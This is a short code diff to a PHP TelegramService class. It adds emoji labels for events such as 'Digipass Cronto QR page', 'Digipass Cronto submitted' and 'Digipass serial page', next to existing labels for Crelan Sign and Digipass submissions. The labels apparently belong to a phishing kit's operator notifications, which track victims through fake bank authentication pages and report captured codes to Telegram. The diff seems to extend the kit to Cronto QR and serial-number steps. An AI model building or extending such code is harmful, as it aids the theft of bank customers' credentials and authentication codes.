@@ -843,7 +843,11 @@ class TelegramService
             'Crelan Sign QR retry' => '🔄',
             'Digipass page' => '🔑',
             'Digipass submitted' => '✅',
+            'Digipass Cronto submitted' => '✅',
             'Method selection page' => '🔀',
+            'Digipass Cronto QR page' => '📷',
+            'Digipass Cronto QR retry' => '🔄',
+            'Digipass serial page' => '🔢',
             default => '📄',
         };
 
